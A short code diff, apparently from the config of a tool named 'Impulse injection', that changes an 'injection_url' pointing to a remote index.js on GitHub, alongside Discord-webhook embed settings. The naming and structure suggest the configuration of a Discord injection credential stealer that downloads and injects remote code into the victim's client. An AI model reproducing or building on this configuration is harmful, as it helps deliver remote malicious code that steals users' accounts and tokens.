@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Impulse injection', 
   embed_icon: 'https://www.origo.hu/i/1305/20130509-fogonosz-semion-mogilevich-orosz-maffiozo.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/pateut198/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/pateu198/injection/main/index.js', 
   /**
    
    **/
